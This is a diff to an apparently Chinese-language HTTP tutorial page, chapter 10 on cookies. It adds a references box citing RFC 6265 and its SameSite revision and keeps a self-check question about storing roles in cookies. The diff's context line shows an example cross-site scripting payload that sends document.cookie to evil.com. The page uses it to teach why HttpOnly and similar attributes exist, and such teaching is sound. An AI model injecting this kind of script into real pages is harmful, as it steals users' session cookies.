@@ -365,6 +365,14 @@ fetch('https://evil.com/steal?cookie=' + document.cookie);</code></pre>
 
         <p>好了，第十章的内容就到这里。Cookie是HTTP从无状态走向"能记住你是谁"的关键机制，但它诞生于一个还不太注重安全的时代，所以我们需要现代的SameSite、HttpOnly、Secure等属性来弥补它的先天不足。下一章我们进入<strong>HTTP认证（Authentication）</strong>——在Cookie之外，HTTP协议还提供了哪些认证方式？Basic、Digest、Bearer Token、API Key……各有各的适用场景。</p>
 
+        <aside class="references" aria-label="标准出处">
+          <p class="ref-title">标准出处</p>
+          <ul>
+            <li>RFC 6265《HTTP State Management Mechanism》(2011)：Set-Cookie / Cookie 头、Domain、Path、Expires、Max-Age、Secure、HttpOnly。</li>
+            <li>RFC 6265bis (draft-ietf-httpbis-rfc6265bis)：SameSite 属性与 Cookie 前缀的现行为规范。</li>
+          </ul>
+        </aside>
+
         <aside class="self-check">
           <p class="q">自测：为什么不应把用户角色（如 <code>role=admin</code>）直接放进 Cookie？正确的做法是什么？</p>
           <button type="button" class="reveal" aria-expanded="false" aria-controls="ch10-a1">显示答案</button>
